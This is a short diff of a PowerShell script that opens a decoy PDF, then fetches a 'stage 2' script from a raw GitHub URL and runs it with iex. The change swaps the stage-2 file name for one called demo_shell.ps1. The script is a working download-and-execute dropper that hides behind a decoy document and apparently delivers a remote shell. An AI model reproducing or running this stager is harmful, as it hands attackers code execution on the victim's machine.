@@ -9,7 +9,7 @@ Invoke-WebRequest -Uri $PdfUrl -OutFile $OutputPath
 Start-Process -FilePath $OutputPath
 
 # Download stage 2
-$pl = iwr https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/main/rv.ps1
+$pl = iwr https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/main/demo_shell.ps1
 
 # Execute Stage 2
 iex $pl
